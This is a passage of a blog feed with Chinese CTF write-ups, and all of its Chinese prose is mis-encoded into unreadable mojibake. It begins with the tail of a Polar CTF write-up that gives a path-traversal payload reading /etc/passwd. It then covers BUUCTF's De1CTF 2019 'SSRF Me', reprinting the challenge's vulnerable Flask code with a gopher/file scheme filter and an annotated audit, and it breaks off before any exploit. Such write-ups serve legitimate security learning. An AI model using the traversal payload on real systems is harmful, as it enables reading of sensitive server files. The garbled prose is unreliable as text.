alt="image-20230923155519918"></p><p>å‘ç°æœ‰.gitæ³„éœ²ï¼Œä½†æ˜¯.gitæ³„éœ²æˆ‘æ²¡å‘ç°æœ‰ç”¨ä¿¡æ¯</p><p>.DS_Store:æ³„éœ²ä¹Ÿæ²¡æœ‰æœ‰ç”¨æ–‡ä»¶</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">sectet_include.php?file=../../../etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923180939030.png" alt="image-20230923180939030"></p><p>å­˜åœ¨æ–‡ä»¶ç›®å½•ç©¿è¶Šï¼Œä¸è¿‡åˆ°æœ€åä¹Ÿæ²¡æœ‰ç©¿è¶Šå‡ºæ¥ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[De1CTF 2019]SSRF Me é¢˜è§£</title>
    <link href="/2023/08/29/2023-08-29-%5BDe1CTF%202019%5DSSRF%20Me/"/>
    <url>/2023/08/29/2023-08-29-%5BDe1CTF%202019%5DSSRF%20Me/</url>
    
    <content type="html"><![CDATA[<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>1.æŸ¥çœ‹æç¤º:<br><img src="/images/2023-8-29-SSRFMe/image-20230829102629610.png" alt="image-20230829102629610"></p><p>2.æ‰“å¼€ç½‘é¡µ:<br><img src="/images/2023-8-29-SSRFMe/image-20230829102651916.png" alt="image-20230829102651916"></p><p>è§‚å¯Ÿä»£ç ï¼Œæ„Ÿè§‰æ˜¯flaskæ³¨å…¥,æ•´ç†ä»£ç ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#! /usr/bin/env python #encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<br>            <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(resp)<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br><br>                <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br><br><br>            <span class="hljs-keyword">else</span>:<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>                result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>            <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>3.ä»£ç å®¡è®¡:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#! /usr/bin/env python #encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-comment"># æœ‰å‚åˆå§‹åŒ–ä¸€ä¸ªTaskå¯¹è±¡</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        <span class="hljs-comment"># å°†å®¢æˆ·ç«¯çš„ipåœ°å€è¿›è¡Œmd5åŠ å¯†</span><br>        self.sandbox = md5(ip)<br>        <span class="hljs-comment"># åˆ¤æ–­è¯¥ipåœ°å€æ˜¯å¦å­˜åœ¨</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<br>            <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            <span class="hljs-comment"># å¦‚æœè¯¥ipåœ°å€ä¸å­˜åœ¨ï¼Œåˆ™ä¸ºè¯¥ipåœ°å€åˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œä½¿è¯¥ipåœ°å€èƒ½å¤Ÿè®¿é—®è¯¥ç½‘ç«™æ–‡ä»¶</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># ç”³è¯·ä¸€ä¸ªresultå­—å…¸</span><br>        result = &#123;&#125;<br>        <span class="hljs-comment"># &#123;&#x27;code&#x27;: 500&#125;</span><br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-comment"># md5(secert_key + param + action)=sign</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                <span class="hljs-comment"># æ‰“å¼€result.txtæ–‡ä»¶ï¼Œå¹¶ç”¨tmpfileæŒ‡ä»£è¯¥æ–‡ä»¶</span><br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                <span class="hljs-comment"># è·å–paramè·¯å¾„ä¸‹çš„æ–‡ä»¶å†…å®¹ï¼Œå¹¶å­˜å‚¨åˆ°respä¸­</span><br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># è¯»å–åˆ°paramæ–‡ä»¶ä¸‹çš„å†…å®¹æ—¶ï¼Œå°†è¯¥æ–‡ä»¶å†…å®¹æ‰“å°ï¼Œä½†æ˜¯è¯¥æ‰“å°çš„å†…å®¹æ— æ³•å‘ˆç°åˆ°ç½‘é¡µä¸­ï¼Œåªèƒ½å‘ˆç°åœ¨ç¼–è¯‘å™¨ä¸­</span><br>                    <span class="hljs-comment"># æ‰€ä»¥æ— æ³•åˆ©ç”¨å…¶æŸ¥çœ‹respçš„å†…å®¹</span><br>                    <span class="hljs-built_in">print</span>(resp)<br>                    <span class="hljs-comment"># å°†è¯»å–çš„æ–‡ä»¶å†…å®¹å†™å…¥tmofileä¸­</span><br>                    tmpfile.write(resp)<br>                    <span class="hljs-comment"># å…³é—­æ–‡ä»¶tmpfile</span><br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                    <span class="hljs-comment"># å†æ¬¡è¯»å–result.txtæ–‡ä»¶</span><br>                    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                    <span class="hljs-comment"># å°†è¯»å–çš„æ–‡ä»¶å†…å®¹å­˜å‚¨åˆ°resultå­—å…¸ä¸­</span><br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br><br>                <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># å¦‚æœactionä¸­æ²¡æœ‰scanåˆ™è¿”å›é”™è¯¯</span><br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>                result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>            <span class="hljs-keyword">return</span> result<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># å¯¹è¯¥å¯¹è±¡çš„actionå’Œparamè¿›è¡Œmd5åŠ å¯†ï¼Œåˆ¤æ–­åŠ å¯†ç»“æœå’Œè¯¥å¯¹è±¡çš„signæ˜¯å¦ç›¸ç­‰</span><br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><span class="hljs-comment"># è®¿é—®url/geneSigæ—¶ï¼Œè¯¥ç½‘é¡µæ”¯æŒgetå’Œpostè¯·æ±‚</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    <span class="hljs-comment"># request.args.get()è·å–å‚æ•°paramçš„å€¼</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-comment"># è®¾ç½®å‚æ•°actionçš„å€¼ä¸ºscan</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-comment"># æ‰§è¡ŒgetSign()å‡½æ•°</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-comment"># è®¿é—®url/De1taæ—¶ï¼Œè¯¥ç½‘é¡µæ”¯æŒGETå’ŒPOSTè¯·æ±‚</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    <span class="hljs-comment"># ä»cookieä¸­è·å–å‚æ•°actionçš„å€¼</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    <span class="hljs-comment"># ä»getæ–¹æ³•ä¸­è·å–å‚æ•°paramçš„å€¼</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-comment"># ä»cookieä¸­è·å–signçš„å€¼</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    <span class="hljs-comment"># ipå­˜å‚¨å®¢æˆ·ç«¯çš„ipåœ°å€</span><br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)):<br>        <span class="hljs-comment"># æŸ¥çœ‹è¾“å…¥çš„paramä¸­æ˜¯å¦å­˜åœ¨éæ³•å­—ç¬¦</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    <span class="hljs-comment"># æœ‰å‚æ•°ç”³è¯·ä¸€ä¸ªTaskç±»ï¼Œç”¨taskå­˜å‚¨è¯¥å¯¹è±¡</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-comment"># è¿”å›ä¸€ä¸ªjsonæ–‡ä»¶æµåˆ°ç½‘é¡µä¸Šï¼Œå³æ˜¾ç¤ºtask.Exec()æ–‡ä»¶å†…å®¹</span><br>    <span class="hljs-comment"># å³æ˜¾ç¤ºresultå­˜å‚¨çš„å†…å®¹</span><br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><span class="hljs-comment"># è®¿é—®url/çš„ç½‘å€æ—¶ï¼Œæ‰§è¡Œindex()å‡½æ•°</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># æ‰“å¼€å¹¶è¯»å–code.txtæ–‡ä»¶</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># è¯»å–paramè·¯å¾„ä¸‹çš„æ–‡ä»¶å†…å®¹</span><br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-comment"># è¿”å›secert_key + param + actionçš„md5ç»“æœ</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-comment"># å¯¹contentå†…å®¹è¿›è¡Œmd5åŠ å¯†</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><span class="hljs-comment"># å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    <span class="hljs-comment"># å»é™¤paramé¦–ä½ç©ºæ ¼ï¼Œå¹¶å°†è¯¥å­—ç¬¦ä¸²å…¨éƒ¨å­—ç¬¦å°å†™åŒ–</span><br>    check = param.strip().lower()<br>    <span class="hljs-comment"># æ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦ä»¥gopherå’Œfileå¼€å¤´</span><br>    <span class="hljs-comment"># å³è¿‡æ»¤äº†gopherå’Œfileä¸¤ä¸ªåè®®</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># mainå‡½æ•°æè¿°äº†è¯¥ä»£ç é€šè¿‡è®¿é—®çš„è·¯ç”±æ¥æ§åˆ¶æ˜¾ç¤ºçš„ç½‘é¡µå†…å®¹</span><br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><h3 id="çŸ¥è¯†ç‚¹ä»‹ç»"><a href="#çŸ¥è¯†ç‚¹ä»‹ç»" class="headerlink" title="çŸ¥è¯†ç‚¹ä»‹ç»:"></a><strong>çŸ¥è¯†ç‚¹ä»‹ç»:</strong></h3><p>å‚è€ƒï¼š<a href="https://geek-docs.com/flask/flask-questions/268_flask_flask_requestargsget_get_all_params_python.html">Flask Flask request.args.get è·å–æ‰€æœ‰å‚æ•°ï¼ˆPythonï¼‰|æå®¢æ•™ç¨‹ (geek-docs.com)</a></p><p><strong>urllib.unquote(string):å°†urlç¼–ç çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç </strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">import urllib.parse<br><br>str = &#x27;%E6%B3%95%E5%9B%BD%E7%BA%A2%E9%85%92&#x27;<br><br>print(urllib.parse.unquote(str))<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">æ³•å›½çº¢é…’<br></code></pre></td></tr></table></figure><h5 id="ä½¿ç”¨request-args-getè·å–æŒ‡å®šå‚æ•°çš„å€¼"><a href="#ä½¿ç”¨request-args-getè·å–æŒ‡å®šå‚æ•°çš„å€¼" class="headerlink" title="ä½¿ç”¨request.args.getè·å–æŒ‡å®šå‚æ•°çš„å€¼"></a>ä½¿ç”¨request.args.getè·å–æŒ‡å®šå‚æ•°çš„å€¼</h5><p>ä¾‹å­:å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªURLä¸º<code>/user?name=John&amp;age=25</code>ï¼Œæˆ‘ä»¬æƒ³è¦è·å–åˆ°å¯¹åº”å‚æ•°çš„å€¼</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 